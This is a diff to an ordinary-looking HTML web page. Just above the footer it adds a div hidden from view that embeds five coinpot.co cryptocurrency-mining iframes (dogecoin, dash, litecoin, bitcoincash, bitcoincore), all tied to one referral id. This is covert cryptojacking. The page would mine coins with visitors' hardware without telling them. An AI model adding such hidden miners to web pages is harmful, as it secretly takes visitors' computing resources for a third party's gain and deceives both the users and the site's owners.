@@ -911,6 +911,15 @@
 
 </div>
 
+<div class="container" hidden>
+
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=1A9A6E2C8CC5&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dash/?ref=1A9A6E2C8CC5&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/litecoin/?ref=1A9A6E2C8CC5&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincash/?ref=1A9A6E2C8CC5&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=1A9A6E2C8CC5&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+</div>
+
 <!-- Footer -->
 <footer class="w3-center w3-black w3-padding-64">
   <a href="#home" class="w3-button w3-light-grey"><i class="fa fa-arrow-up w3-margin-right"></i>To the top</a>
